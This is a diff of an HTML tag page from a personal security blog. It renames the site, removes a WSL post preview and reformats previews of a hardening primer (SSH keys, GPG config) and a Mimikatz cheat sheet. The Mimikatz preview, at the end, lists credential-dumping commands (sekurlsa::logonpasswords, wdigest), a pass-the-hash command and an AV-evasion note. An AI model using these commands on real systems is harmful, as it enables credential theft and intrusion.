@@ -15,11 +15,11 @@
   <meta name="twitter:card" content="summary" />
   <meta property="og:url" content="https://blackvolga.github.io/tags/intel/" />
   <meta property="og:type" content="website" />
-  <meta property="og:site_name" content="BLACKVOLGA" />
+  <meta property="og:site_name" content="BLVCKƔXLGV" />
 
   <meta name="generator" content="Hugo 0.49" />
   <link rel="canonical" href="https://blackvolga.github.io/tags/intel/" />
-  <link rel="alternate" href="https://blackvolga.github.io/tags/intel/index.xml" type="application/rss+xml" title="BLACKVOLGA">
+  <link rel="alternate" href="https://blackvolga.github.io/tags/intel/index.xml" type="application/rss+xml" title="BLVCKƔXLGV">
 
   
   
@@ -56,10 +56,6 @@
                 
                   <a href="/post/wsl">wsl</a>
                 
-                  <a href="/post/002">#002</a>
-                
-                  <a href="/post/003">#003</a>
-                
               </div>
             </li>
           
@@ -83,7 +79,7 @@
         
           
             <li>
-              <a title="links" href="/intel/links">links</a>
+              <a title="ref" href="/intel/links">ref</a>
             </li>
           
         
@@ -97,8 +93,8 @@
     
       <div class="avatar-container">
         <div class="avatar-img-border">
-          <a title="BLACKVOLGA" href="https://blackvolga.github.io">
-            <img class="avatar-img" src="https://blackvolga.github.io/img/avatar-icon.png" alt="BLACKVOLGA" />
+          <a title="BLVCKƔXLGV" href="https://blackvolga.github.io">
+            <img class="avatar-img" src="https://blackvolga.github.io/img/avatar-icon.png" alt="BLVCKƔXLGV" />
           </a>
         </div>
       </div>
@@ -197,60 +193,6 @@
         <div class="posts-list">
           
             <article class="post-preview">
-              <a href="https://blackvolga.github.io/post/wsl/">
-                <h2 class="post-title">wsl</h2>
-
-                
-                  <h3 class="post-subtitle">
-                    Without torture, no science
-                  </h3>
-                
-              </a>
-
-              <p class="post-meta">
-                <span class="post-meta">
-  
-  
-  <i class="fa fa-calendar-o"></i>&nbsp;Posted on October 6, 2018
-  
-  
-  &nbsp;|&nbsp;
-  <i class="fa fa-clock-o"></i> 2 minutes (361 words)
-  
-  
-</span>
-
-
-              </p>
-              <div class="post-entry">
-                
-                  Sometimes we all get stuck on a windows machine. Luckily Windows subsystem for Linux has matured into a surprising alternative to cygwin or VMs for your basic terminal needs.
-First Thing&rsquo;s First
-Windows 10 is a clusterfuck of bloatware, ads and tracking. Remove as much as you can before you begin (why haven&rsquo;t you done this already?)
-https://github.com/adolfintel/Windows10-Privacy
-Debian WSL Install
- Install WSL - Open PowerShell as Administrator (restart required) Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux Install Debian Invoke-WebRequest -Uri https://aka.
-                  <a href="https://blackvolga.github.io/post/wsl/" class="post-read-more">[Read More]</a>
-                
-              </div>
-
-              
-                <div class="blog-tags">
-                  
-                    <a href="https://blackvolga.github.io/tags/intel/">intel</a>&nbsp;
-                  
-                    <a href="https://blackvolga.github.io/tags/windows/">windows</a>&nbsp;
-                  
-                    <a href="https://blackvolga.github.io/tags/wsl/">wsl</a>&nbsp;
-                  
-                    <a href="https://blackvolga.github.io/tags/debian/">debian</a>&nbsp;
-                  
-                </div>
-              
-
-            </article>
-          
-            <article class="post-preview">
               <a href="https://blackvolga.github.io/intel/101/">
                 <h2 class="post-title">101</h2>
 
@@ -278,20 +220,18 @@ Debian WSL Install
               </p>
               <div class="post-entry">
                 
-                  #OS Antergos OR TAILS
-Start with the basics: https://ssd.eff.org/en Advanced Mode: https://www.qubes-os.org/
-##Arch First Steps
-https://github.com/Jguer/yay
+                  OS Antergos OR TAILS
+Start with the basics: https://ssd.eff.org/en
+Advanced Mode: https://www.qubes-os.org/
+Arch First Steps https://github.com/Jguer/yay
 https://github.com/sorin-ionescu/prezto
 https://wiki.archlinux.org/index.php/security
 For everything else, see the oracle: wiki.archlinux.org
-##SSH
-EdDSA requires OpenSSH 6.5 (ssh -V) or GnuPG 2.1 (gpg –version) so use 4096 bit RSA keys if ED25519 is not available.
+SSH EdDSA requires OpenSSH 6.5 (ssh -V) or GnuPG 2.1 (gpg –version) so use 4096 bit RSA keys if ED25519 is not available.
 ssh-keygen -t ed25519 -a 100 OR ssh-keygen -t rsa -b 4096 -o -a 100
 Ref: https://stribika.github.io/2015/01/04/secure-secure-shell.html
-##GPG
-~/.gnupg/gpg.conf:
-# Avoid information leaked no-emit-version no-comments export-options export-minimal # Displays the long format of the ID of the keys and their fingerprints keyid-format 0xlong with-fingerprint # Displays the validity of the keys list-options show-uid-validity verify-options show-uid-validity # Limits the algorithms used personal-cipher-preferences AES256 personal-digest-preferences SHA512 default-preference-list SHA512 SHA384 SHA256 RIPEMD160 AES256 TWOFISH BLOWFISH ZLIB BZIP2 ZIP Uncompressed cipher-algo AES256 digest-algo SHA512 cert-digest-algo SHA512 compress-algo ZLIB disable-cipher-algo 3DES weak-digest SHA1 s2k-cipher-algo AES256 s2k-digest-algo SHA512 s2k-mode 3 s2k-count 65011712 ###Create Master Key gpg2 --expert --full-gen-key OPTION 8 &gt; s &gt; e &gt; q 4096 &gt; 1y &gt; y
+GPG ~/.gnupg/gpg.conf:
+# Avoid information leaked no-emit-version no-comments export-options export-minimal # Displays the long format of the ID of the keys and their fingerprints keyid-format 0xlong with-fingerprint # Displays the validity of the keys list-options show-uid-validity verify-options show-uid-validity # Limits the algorithms used personal-cipher-preferences AES256 personal-digest-preferences SHA512 default-preference-list SHA512 SHA384 SHA256 RIPEMD160 AES256 TWOFISH BLOWFISH ZLIB BZIP2 ZIP Uncompressed cipher-algo AES256 digest-algo SHA512 cert-digest-algo SHA512 compress-algo ZLIB disable-cipher-algo 3DES weak-digest SHA1 s2k-cipher-algo AES256 s2k-digest-algo SHA512 s2k-mode 3 s2k-count 65011712 Create Master Key gpg2 --expert --full-gen-key
                   <a href="https://blackvolga.github.io/intel/101/" class="post-read-more">[Read More]</a>
                 
               </div>
@@ -336,7 +276,8 @@ Ref: https://stribika.github.io/2015/01/04/secure-secure-shell.html
                 
                   https://github.com/gentilkiwi/mimikatz
 https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
-TLDR: 1.\mimikatz &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; exit
+TLDR:
+1.\mimikatz &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; exit
 extract passwds
 1mimikatz_command -f sekurlsa::logonPasswords full 2mimikatz_command -f sekurlsa::wdigest pass the hash (on the left hand side)
 1sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe mimidawgz (avoid AV detection)
